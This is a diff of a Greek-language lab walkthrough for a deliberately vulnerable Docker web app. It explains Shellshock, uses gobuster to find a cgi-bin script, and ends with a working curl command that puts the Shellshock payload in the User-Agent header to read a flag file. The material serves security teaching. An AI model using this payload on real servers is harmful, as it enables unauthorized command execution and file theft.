@@ -1,2 +1,17 @@
-sudo docker image build -t vuln_web_app .
-sudo docker run -p 5052:80  vuln_web_app
+Το shellshock είναι security bug στο Unix Bash Shell που επιτρέπει στον επιτιθέμενο να εκτελέσει εντολές bash από μεταβλητές περιβάλλοντος.
+Αυτό είναι άκρως επικίνδυνο καθώς επιτρέπει στον επιτιθεμένο τόσο να διαβάσει αρχεία στο σύστημα, όσο και να πάρει τον πλήρη έλεγχο αυτού.
+sudo docker build --tag=vuln_web_app .
+sudo docker run -p 5052:80 --rm --name=vuln_web_app  vuln_web_app
+
+sudo apt install gobuster : Πρόγραμμα για bruteforce directory
+
+wget https://raw.githubusercontent.com/v0re/dirb/master/wordlists/small.txt : Wordlist για το bruteforce
+
+gobuster -u http://localhost:5052/ -w /home/marios/Desktop/small.txt - Βρίσκουμε directory με το όνομα cgi-bin
+
+gobuster -u http://localhost:5052/cgi-bin -w /home/marios/Desktop/small.txt - Ξανατρέχουμε για έξτρα αρχεία μέσα στο νέο directory.
+Βλέπουμε το secret
+
+Είμαστε σίγουροι ότι πρόκειται για shellshock vulnerability.
+curl -A "() { :; }; echo \"Content-type: text/plain\"; echo; /bin/cat /home/secret/flag.txt" localhost:5052/cgi-bin/secret
+
